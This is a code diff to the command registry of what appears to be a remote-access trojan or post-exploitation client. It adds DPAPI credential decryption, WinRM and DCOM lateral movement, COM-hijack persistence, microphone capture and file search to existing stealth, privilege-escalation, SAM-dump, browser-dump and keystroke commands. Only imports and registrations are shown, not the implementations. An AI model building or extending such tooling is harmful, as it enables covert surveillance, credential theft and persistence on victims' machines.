@@ -17,6 +17,8 @@ from client.commands.stealth_commands import (
     UnhookCommand, SyscallInjectCommand, EarlyBirdCommand,
     PtieshCommand, StreamStartCommand, StreamStopCommand,
     SamDumpCommand, BrowserDumpV2Command,
+    DpapiCommand, WinrmCommand, DcomCommand, ComHijackCommand,
+    MicCommand, FileSearchCommand,
 )
 from client.commands.privesc_commands import PrivescLinuxCommand, PrivescWindowsCommand
 from client.commands.rat_commands import KeystrokeCommand, MouseCommand, ClickCommand, LockScreenCommand
@@ -81,6 +83,12 @@ def build_client_registry() -> CommandRegistry:
     registry.register(StreamStopCommand())
     registry.register(SamDumpCommand())
     registry.register(BrowserDumpV2Command())
+    registry.register(DpapiCommand())
+    registry.register(WinrmCommand())
+    registry.register(DcomCommand())
+    registry.register(ComHijackCommand())
+    registry.register(MicCommand())
+    registry.register(FileSearchCommand())
     registry.register(PrivescLinuxCommand())
     registry.register(PrivescWindowsCommand())
     registry.register(KeystrokeCommand())
